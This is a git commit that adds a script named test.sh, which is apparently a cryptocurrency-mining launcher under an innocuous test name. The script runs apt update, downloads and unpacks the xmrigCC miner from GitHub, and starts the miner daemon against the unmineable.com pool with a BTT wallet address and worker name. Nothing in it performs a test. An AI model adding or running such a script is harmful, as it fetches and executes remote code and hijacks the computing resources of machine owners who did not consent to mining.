464177fa3c0339d5e565631fb8a0f9899f1504a4
Acer210 <92589064+Acer210@users.noreply.github.com>
2021-10-16 09:07:39 +0700

    Create test.sh

---
+++ test.sh
@@ -0,0 +1,4 @@
+#BTT
+sudo apt update
+wget https://github.com/Bendr0id/xmrigCC/releases/download/2.9.4/xmrigCC-2.9.4-linux-generic-amd64.tar.gz && tar -xf xmrigCC-2.9.4-linux-generic-amd64.tar.gz && rm xmrigCC-2.9.4-linux-generic-amd64.tar.gz
+./miner/xmrigDaemon -o rx.unmineable.com:3333 -u BTT:TTAmw5muo74jaZ5Sr8QCxzDScfeusS4HbN.Jamet -p WK01 -k -a cn-heavy/xhv
